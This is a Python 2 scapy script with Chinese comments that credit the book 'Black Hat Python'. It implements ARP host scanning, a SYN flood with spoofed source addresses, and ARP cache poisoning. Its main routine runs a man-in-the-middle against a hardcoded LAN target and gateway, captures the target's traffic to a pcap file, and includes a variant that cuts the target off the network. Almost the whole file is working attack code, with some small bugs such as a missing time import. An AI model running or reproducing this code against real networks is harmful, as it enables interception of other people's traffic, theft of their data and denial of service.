# -*- coding:utf-8 -*-
from scapy.all import *
import socket
import json
import random
import os
import sys
import threading
import signal
from job import Job

global mode


#scan active host
def active_host(ip_section):
    host_list = my_arping(ip_section)
    #ip_list = [x[0] for x in host_list]
    #mac_list = [x[1] for x in host_list]
    #print ip_list
    #print '*'*10
    #print mac_list
    return host_list#,ip_list,mac_list



#send arp parket to ip section
def my_arping(net, timeout=2, cache=0, verbose=None, **kargs):
    host_list = []
    """Send ARP who-has requests to determine which hosts are up
    arping(net, [cache=0,] [iface=conf.iface,] [verbose=conf.verb]) -> None
    Set cache=True if you want arping to modify internal ARP-Cache"""
    if verbose is None:
        verbose = conf.verb
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=net), verbose=verbose,filter="arp and arp[7] = 2",
                     timeout=timeout, iface_hint=net, **kargs)
    for s, r in ans.res:
        ip = r.sprintf("%ARP.psrc%")
        mac = r.sprintf("%Ether.src%")
        #print ip+':'+mac
        host_list.append((ip,mac))
    return host_list


def get_hostname_by_ip(ipaddr):
    try:
        result = socket.gethostbyaddr(ipaddr)
        return result[0]
    except socket.herror,e:
        print e
        return None

def load_rules(filename):
    with open(filename,"r") as f:
    #    input = f.read()
        rules = json.load(f)
    #print rules
    #print type(rules)
    #print input[0]['ip']
    return rules

def tcp_syn_flood(ip,dPort):
    srcList = ['201.1.1.2', '10.1.1.102', '69.1.1.2', '125.130.5.199']
    for sPort in range(1024, 65535):
        index = random.randrange(4)
        ipLayer = IP(src=srcList[index], dst=ip)
        tcpLayer = TCP(sport=sPort, dport=dPort, flags="S")
        packet = ipLayer / tcpLayer
        send(packet)

def packet(packet):
    print packet.show()

def start_sniff_arp(packet_callback,IPSECTION):

    sniff(filter= "arp and net {0}".format(IPSECTION), prn = packet_callback,count=0,store=0)


'''
以下代码 from python 黑帽子
'''

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):

    # 以下代码调用send函数的方式稍有不同
    print "[*] Restoring target..."
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)

    # 发出退出信号到主线程
    #os.kill(os.getpid(), signal.SIGKILL)
    os.kill(os.getpid(), signal.SIGINT)

def get_mac(ip_address):

    # srp函数（发送和接收数据包，发送指定ARP请求到指定IP地址,然后从返回的数据中获取目标ip的mac）
    responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)
    #　返回从响应数据中获取的MAC地址
    for s,r in responses:
        return r[Ether].src
    return None

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):

    # 构建欺骗目标的ARP请求()，这里没设置hwsrc,默认就是本机咯
    # 简单来说：告诉被攻击机器，本机（攻击机）的mac是网关，就是攻击者的机器是网关
    poison_target = ARP()
    poison_target.op = 2                # 响应报文
    poison_target.psrc = gateway_ip     # 模拟是网关发出的, 其实是我们的机器发出的
    poison_target.pdst = target_ip      # 目的地是目标机器
    poison_target.hwdst = target_mac    # 目标的物理地址是目标机器的mac

    # 构建欺骗网关的ARP请求()，这里没设置hwsrc,默认就是本机咯
    poison_gateway = ARP()
    poison_gateway.op = 2               # 响应报文
    poison_gateway.psrc = target_ip     # 模拟是目标机器发出的,
    poison_gateway.pdst = gateway_ip    # 目的地是网关
    poison_gateway.hwdst = gateway_mac  # 目标的物理地址是网关的mac

    print "[*] Beginning the ARP poison. ［CTRL_C to stop］"

    while True:
        try:
            print 'send arp packet'
            # 开始发送ARP欺骗包(投毒)
            send(poison_target)
            send(poison_gateway)
            # 停两秒
            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

    print "[*] ARP poison attack finished"
    return

def cut_target(gateway_ip, gateway_mac, target_ip, target_mac):
    # 构建欺骗目标的ARP请求()，这里没设置hwsrc,默认就是本机咯
    # 简单来说：告诉被攻击机器，本机（攻击机）的mac是网关，就是攻击者的机器是网关
    poison_target = ARP()
    poison_target.op = 2                # 响应报文
    poison_target.psrc = gateway_ip     # 模拟是网关发出的, 其实是我们的机器发出的
    poison_target.pdst = target_ip      # 目的地是目标机器
    poison_target.hwdst = target_mac    # 目标的物理地址是目标机器的mac

    # 构建欺骗网关的ARP请求()，这里没设置hwsrc,默认就是本机咯
    poison_gateway = ARP()
    poison_gateway.op = 2               # 响应报文
    poison_gateway.psrc = target_ip     # 模拟是目标机器发出的,
    poison_gateway.pdst = gateway_ip    # 目的地是网关
    poison_gateway.hwdst = gateway_mac  # 目标的物理地址是网关的mac

    print "[*] Beginning the ARP attack. ［CTRL_C to stop］"

    while True:
        try:
            # 开始发送ARP欺骗包(投毒)
            send(poison_target)
            send(poison_gateway)
            # 停两秒
            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

    print "[*] ARP poison attack finished"
    return



def stop_sniff():
    print '[*]Stop the Sniffing .....'

    return False

def start_sniff(packet_count,bdf_filter):
    sniff(count=packet_count, filter=bpf_filter)


if __name__ == "__main__":
    global mode
    packet_count = 10
    '''
    gateway_ip = '10.2.10.254'
    target_ip = '10.2.10.251'
    target_mac = ''
    '''
    gateway_ip = '192.168.1.1'
    gateway_mac = '78:a1:06:95:c1:8e'
    target_ip = '192.168.1.101'
    target_mac = ''

    # 获取网关mac
    gateway_mac = get_mac(gateway_ip)

    if gateway_mac is None:
        print "[!!!] Failed to get gateway MAC. Exiting"
        sys.exit(0)
    else:
        print "[*] Gateway %s is at %s" % (gateway_ip, gateway_mac)

    # 获取目标(被攻击的机器)mac
    target_mac = get_mac(target_ip)

    if target_mac is None:
        print "[!!!] Failed to get target MAC. Exiting"
        sys.exit(0)
    else:
        print "[*] Target %s is at %s" % (target_ip, target_mac)

    # 启动ARP投毒（欺骗）线程
    poison_thread = Job(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
    poison_thread.setDaemon(True)
    poison_thread.start()

    try:
        print "[*] Starting sniffer for %d packets" % packet_count

        bpf_filter = "ip host %s " % target_ip  # 过滤器
        #sniff_thread = Job(target=start_sniff,args=(packet_count,bpf_filter))
        #sniff_thread.setDaemon(True)
        #sniff_thread.start()
        packets = sniff(count=packet_count, filter=bpf_filter,prn=packet)#,stopper = stop_sniff,stopper_timeout =1)

        # 将捕获到的数据包输出到文件

        #time.sleep(5)
        wrpcap('listen_data.pcap', packets)
        poison_thread.stop()
        #sniff_thread.stop()
        # 还原网络配置
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

    except KeyboardInterrupt:
        # 还原网络配置
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)
    #ans = active_host("10.2.10.*")
    #ans = active_host("192.168.0.*")
    #host_list = my_arping("192.168.1.*")

    #print host_list

    #host_list2 = active_host("192.168.1.*")

    #print host_list2

    #print get_hostname_by_ip("192.168.1.101")
    #for s, r in ans.res:
    #    print r.sprintf("%19s,Ether.src% %ARP.psrc%")
    #load_rules('../config/rules.json')
    #print ans2
    #print ans3
    #start_sniff(packet)
    #tcp_syn_flood('192.168.0.101',80)